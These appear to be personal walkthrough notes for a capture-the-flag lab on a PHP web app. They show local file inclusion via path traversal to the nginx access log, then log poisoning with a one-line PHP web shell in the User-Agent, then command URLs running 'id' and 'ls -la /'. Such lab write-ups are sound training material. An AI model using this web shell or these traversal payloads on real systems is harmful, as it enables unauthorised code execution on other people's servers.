
**Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.**

clicking on ABOUT US found a parameter
![[Pasted image 20230306003211.png]]

testing php wrappers and base64 worked 
![[Pasted image 20230306004355.png]]
decode index.php
![[Pasted image 20230306004446.png]]
looking for included php files
![[Pasted image 20230306004524.png]]

found admin panel path
![[Pasted image 20230306005924.png]]
![[Pasted image 20230306005946.png]]
Looks like it's some logs for different services
trying LFI on log parameter 
![[Pasted image 20230306010248.png]]
and we have a basic LFI
![[Pasted image 20230306010347.png]]
but it shows result on website
![[Pasted image 20230306015415.png]]
`http://161.35.42.119:32388/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log`
Reseting the box cos too many requests made logs so laggy
![[Pasted image 20230306020824.png]]
now that we have access to log file we can poison the logs
changing our user agent to RCE code
![[Pasted image 20230306021152.png]]
`<?php system($_GET['cmd']); ?>`

`view-source:http://159.65.87.207:30810/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=id`
![[Pasted image 20230306021221.png]]


`view-source:http://159.65.87.207:30551/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=ls%20-la%20/`
![[Pasted image 20230306023917.png]]
